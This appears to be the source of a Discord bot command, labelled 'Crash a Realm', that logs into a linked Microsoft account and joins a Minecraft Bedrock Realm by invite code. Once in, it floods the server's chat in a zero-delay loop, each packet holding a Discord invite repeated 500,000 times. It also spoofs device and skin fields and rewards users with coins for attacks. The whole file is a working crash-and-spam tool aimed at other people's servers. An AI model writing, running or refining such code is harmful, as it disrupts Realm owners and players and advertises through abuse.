const fs = require('fs');
const { SlashCommandBuilder } = require('discord.js');
const bedrock = require('bedrock-protocol');
const { RealmAPI } = require('prismarine-realms');
const { Authflow } = require('prismarine-auth');
const { setTimeout } = require('timers/promises');
const skinData = require('../../data/ssbp.json');
const { NIL, v3: uuidv3, v4: uuidv4 } = require('uuid');
const { cat1, error, loading, replystart, replyend } = require('../../data/emojie');
const { discordInvite, discordlink, footer } = require('../../data/config');
const { checkAndSaveRealm,saveCoins } = require('../functions/realms.js')


module.exports = {
    command: new SlashCommandBuilder()
        .setName('ssbp')
        .setDescription('Crash a Realm')
        .setIntegrationTypes(0, 1)
        .setContexts(0, 1, 2)
        .addStringOption(option =>
            option.setName('realmcode')
                .setDescription('The Realm Code of the Realm.')
                .setRequired(true))
        .addIntegerOption(option =>
            option.setName('duration')
                .setDescription('Duration in seconds to stay connected to the Realm.')
                .setRequired(true)
                .setMinValue(5)
                .setMaxValue(120)
            ),
    execute: async (interaction) => {
        await interaction.deferReply();

        try {
            const realmCode = interaction.options.getString('realmcode');
            const duration = interaction.options.getInteger('duration');
            const deviceOS = interaction.options.getInteger('device_os');
            const name = `§4§kkJustNarkX99999999999`;
            const userId = interaction.user.id;
            const profilesFolder = `./authCache/${userId}`;
            const baseCoins = 20;
            const bonusCoins = Math.floor(duration / 20) * 100;
            const totalCoins = baseCoins + bonusCoins;

            // Check if profiles folder exists
            if (!fs.existsSync(profilesFolder)) {
                await interaction.editReply({
                    embeds: [
                        {
                            title: `${error} Account Not Linked ${error} `,
                            description: `It seems like you haven't linked an account yet.\nPlease link an account whit `+'`/link `' + `to use this command.`,
                            color: 0xff0000,
                            footer: {
                                text: `${interaction.user.username} | discord.gg/frosted`,
                                iconURL: interaction.user.displayAvatarURL(),
                            },
                        },
                    ],
                });
                return;
            }

            const userIdentifier = undefined;
            const options = { authTitle: '00000000441cc96b', flow: 'live' };
            const authFlow = new Authflow(userIdentifier, profilesFolder, options);
            const realms = RealmAPI.from(authFlow, 'bedrock');
            const realm = await realms.getRealmFromInvite(realmCode);
            const realmName = realm?.name || 'Unknown';

            const embed = {
                title: `${cat1} Connecting to Realm: ${realmName} ${cat1}`,
                description: '',
                footer: { text: 'Attempting connection...' },
            };
            await interaction.editReply({ embeds: [embed] });

            const client = bedrock.createClient({
                profilesFolder,
                offline: false,
                skinData: {
                    CurrentInputMode: 3,
                    DefaultInputMode: 3,
                    DeviceOS: deviceOS,
                    DeviceId: uuidv3(uuidv4(), NIL),
                    PlatformOnlineId: generateRandomString(19, '1234567890'),
                    PrimaryUser: false,
                    SelfSignedId: uuidv4(),
                    ThirdPartyName: name,
                    ThirdPartyNameOnly: true,
                    TrustedSkin: true,
                },
                skipPing: true,
                realms: {
                    [realmCode.length === 8 ? "realmId" : "realmInvite"]: realmCode.length === 8 ? realmCode : `${realmCode}`,
                },
            });

            client.on('join', async () => {
                checkAndSaveRealm(realmCode, userId)
                saveCoins(userId, totalCoins); 
                try {
                    const disconnectTime = Date.now() + duration * 1000;
                    const updatedEmbed = {
                        title: `${cat1} Connected to: ${realmName} ${cat1}`,
                        description: `${replystart}Successfully joined the Realm\n${replystart}Realm Code: ${realmCode}\n${replyend}You will earn **${totalCoins} coins**`,
                        fields: [
                            { name: 'Leaving in', value: `<t:${Math.floor(disconnectTime / 1000)}:R>`, inline: false },
                        ],
                        footer: {
                            text: `${interaction.user.username} | discord.gg/frosted`,
                            iconURL: interaction.user.displayAvatarURL(),
                        },
                    };
                    await interaction.editReply({ embeds: [updatedEmbed] });
                    console.log(`Connected to Realm: ${realmName} (${realmCode})`);
                } catch (error) {
                    console.error(`Error Realm: ${error.message}`);
                }
            });

            client.on('close', async (err) => {
                if (!client.disconnected) {
                    console.log('Client connection closed.');
                    client.disconnected = true; // same like on crash players command 
                }
                if (err) console.error(err);
            });
            
            client.on('error', async (err) => {
                if (!client.disconnected) {
                    client.disconnect();
                    client.disconnected = true; // pluh !
                    console.error('Client error:', err);
                    if (err.message.includes('size mismatch')) {
                            console.error('String size mismatch detected:', err.message);
                    } else {
                        console.error('Unexpected client error:', err.message);
                    }

                    await interaction.followUp({
                        embeds: [
                            {
                                title: 'Error Occurred',
                                description: 'An error occurred while connecting to the Realm.',
                                color: 0xff0000,
                                fields: [
                                    { name: 'Reason', value: err.message || 'Unknown error' },
                                ],
                                footer: {
                                    text: `${interaction.user.username} | discord.gg/frosted`,
                                    iconURL: interaction.user.displayAvatarURL(),
                                },
                            },
                        ],
                    });
                }
            });
            
            let spamInterval = null;
            client.on('play_status', async () => {
                try {
                    let messageCount = 0;
                    const maxMessages = 100000; 
            
                    spamInterval = setInterval(() => {
                        if (messageCount >= maxMessages) {
                            clearInterval(spamInterval);
                            return;
                        }
                        client.write('text', {
                            filtered_message: '',
                            type: 'chat',
                            needs_translation: false,
                            source_name: client.profile.name,
                            message: `${discordInvite}\n`.repeat(500000),
                            xuid: '0',
                            platform_chat_id: '0',
                        });
                        client.write('text', {
                            filtered_message: '',
                            type: 'chat',
                            needs_translation: false,
                            source_name: client.profile.name,
                            message: `${discordInvite}\n`.repeat(500000),
                            xuid: '0',
                            platform_chat_id: '0',
                        });
                        messageCount++;
                    }, 0);
            
                    await setTimeout(duration * 1000);
                    clearInterval(spamInterval);
                    client.disconnect();
                } catch (error) {
                    console.error('Error in play_status:', error.message);
                    if (spamInterval) clearInterval(spamInterval);
                }
            });
            

            client.on('kick', async (packet) => {
                let reason = packet?.reason || 'Unknown reason';
                client.disconnect();
                await interaction.editReply({
                    embeds: [
                        {
                            title: 'Client Kicked',
                            description: 'Client got kicked from the Realm.',
                            color: 0xffa500,
                            fields: [
                                { name: 'Reason', value: reason },
                            ],
                            footer: {
                                text: `${interaction.user.username} | discord.gg/frosted`,
                                iconURL: interaction.user.displayAvatarURL(),
                            },
                        },
                    ],
                });
            });


            await setTimeout(duration * 1000);
            client.close();
        } catch (error) {
            console.error(error);

            const errorEmbed = {
                title: 'Error Occurred',
                description: 'The bot encountered an issue while joining the Realm.',
                color: 0xff0000,
                fields: [
                    { name: 'Reason', value: error.message || 'Unknown error', inline: false },
                ],
                footer: {
                    text: `${interaction.user.username} | discord.gg/frosted`,
                    iconURL: interaction.user.displayAvatarURL(),
                },
            };

            await interaction.editReply({ embeds: [errorEmbed] });
        }
    },
};

function generateRandomString(length, charSet) {
    if (!charSet) charSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_-';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += charSet.charAt(Math.floor(Math.random() * charSet.length));
    }
    return result;
}
